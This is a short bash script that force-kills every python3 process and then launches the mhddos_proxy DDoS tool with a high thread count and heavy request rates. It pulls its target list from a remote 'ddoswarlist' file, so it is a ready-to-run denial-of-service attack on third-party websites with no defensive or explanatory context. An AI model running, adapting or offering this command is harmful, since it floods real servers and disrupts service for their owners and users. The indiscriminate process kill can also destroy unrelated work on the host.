#!/bin/bash
sudo pkill -9 -f "python3" 
cd /root/mhddos_proxy; python3 runner.py -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods STRESS GET -t 2000 -p 350 --rpc 2000 --debug